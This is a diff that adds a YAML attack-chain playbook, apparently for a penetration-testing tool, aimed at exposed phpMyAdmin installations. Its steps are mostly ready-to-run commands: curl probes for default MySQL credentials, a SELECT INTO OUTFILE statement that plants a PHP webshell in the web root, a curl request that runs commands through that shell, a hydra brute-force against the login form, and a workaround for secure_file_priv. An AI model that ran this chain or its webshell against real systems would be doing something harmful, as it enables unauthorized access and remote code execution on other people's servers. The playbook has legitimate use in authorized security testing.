@@ -1,0 +1,48 @@
+chain_id: phpmyadmin_default_to_rce
+title: "phpMyAdmin — default credentials → SQL → file write → PHP webshell"
+severity: HIGH
+tags: [web, phpmyadmin, default-creds, mysql, file-upload, rce]
+
+trigger:
+  any_of:
+    - { path_pattern: "(?i)/phpmyadmin/?" }
+    - { banner_pattern: "(?i)phpmyadmin" }
+
+description: |
+  phpMyAdmin exposed at /phpmyadmin/. Try default MySQL credentials
+  (root / root, root / blank, admin / admin) — the box almost always
+  forgets to change these. Once authenticated, use `SELECT ... INTO
+  OUTFILE` to drop a PHP webshell into the docroot.
+
+steps:
+  - id: 1
+    title: "Default credential probe"
+    command: |
+      curl -i -X POST -d 'pma_username=root&pma_password=' http://$VICTIMA/phpmyadmin/index.php?route=/
+      curl -i -X POST -d 'pma_username=root&pma_password=root' http://$VICTIMA/phpmyadmin/index.php?route=/
+
+  - id: 2
+    title: "Once logged in, drop a PHP webshell via SQL"
+    command: |
+      -- In the phpMyAdmin SQL tab:
+      SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
+
+  - id: 3
+    title: "Trigger"
+    command: curl 'http://$VICTIMA/shell.php?cmd=id'
+
+common_errors:
+  - error: "Access denied for user ... (using password: NO)"
+    solution: |
+      The MySQL user has a non-empty password. Try `root:root`,
+      `root:toor`, `root:admin`, then brute-force with hydra:
+        hydra -l root -P /usr/share/wordlists/rockyou.txt $VICTIMA \
+          http-post-form '/phpmyadmin/index.php?route=/:pma_username=^USER^&pma_password=^PASS^:F=Cannot log in'
+  - error: "ERROR 1290 — secure_file_priv prevents OUTFILE writes"
+    solution: |
+      `SHOW VARIABLES LIKE 'secure_file_priv';` returns the only path
+      writable by INTO OUTFILE. Drop the shell there instead, then look
+      for its URL via gobuster.
+
+references:
+  - https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/phpmyadmin
